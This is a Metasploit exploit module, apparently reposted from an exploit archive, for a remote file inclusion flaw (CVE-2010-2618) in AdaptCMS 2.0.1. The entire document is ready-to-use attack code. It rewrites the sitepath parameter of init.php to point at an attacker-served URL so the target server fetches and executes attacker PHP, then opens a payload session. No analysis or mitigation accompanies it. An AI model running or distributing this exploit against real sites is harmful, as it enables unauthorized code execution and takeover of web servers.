AdaptCMS 2.0.1 Beta Release Remote File Inclusion Vulnerability (msf)
=====================================================================

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking
 
    include Msf::Exploit::Remote::Tcp
    include Msf::Exploit::Remote::HttpClient
    include Msf::Exploit::Remote::HttpServer::PHPInclude
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;AdaptCMS 2.0.1 Beta Released Remote File Inclusion Exploit&#039;,
            &#039;Description&#039;    => %q{
                    This module can be used to exploit Remote File Inclusion in AdaptCMS 2.0.1 or earlier in file /inc/smarty/libs/init.php.
 
            },
            &#039;Author&#039;         => [ &#039;v3n0m&#039; , &#039;Yogyacarderlink-Indonesia&#039; ],
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Version&#039;        => &#039;$Revision:$&#039;,
            &#039;References&#039;     =>             
                [
                    [ &#039;CVE&#039;, &#039;2010-2618&#039; ],
                    [ &#039;BID&#039;, &#039;41116&#039; ],
                ],
            &#039;Privileged&#039;     => false,
            &#039;Payload&#039;        =>
                {
                    &#039;DisableNops&#039; => true,
                    &#039;Compat&#039;      =>
                        {
                            &#039;ConnectionType&#039; => &#039;find&#039;,
                        },
                    &#039;Space&#039;       => 262144, # 256k
                },
            &#039;Platform&#039;       => &#039;php&#039;,
            &#039;Arch&#039;           => ARCH_PHP,
            &#039;Targets&#039;        => [[ &#039;Automatic&#039;, { }]],
            &#039;DisclosureDate&#039; => &#039;Oct 12 2010&#039;,
            &#039;DefaultTarget&#039; => 0))
 
        register_options([
            OptString.new(&#039;PHPURI&#039;, [ true , "The URI to request, with the include parameter changed to !URL!", &#039;/inc/smarty/libs/init.php?sitepath=!URL!&#039;]),
            ], self.class)
    end
 
    def php_exploit
 
        timeout = 0.01
        uri = datastore[&#039;PHPURI&#039;].gsub(&#039;!URL!&#039;, Rex::Text.to_hex(php_include_url, "%"))
        print_status("Trying uri #{uri}")
 
        response = send_request_raw( {
                &#039;global&#039; => true,
                &#039;uri&#039; => uri,
            },timeout)
 
        if response and response.code != 200
            print_error("Server returned non-200 status code (#{response.code})")
        end
         
        handler
    end
 
end



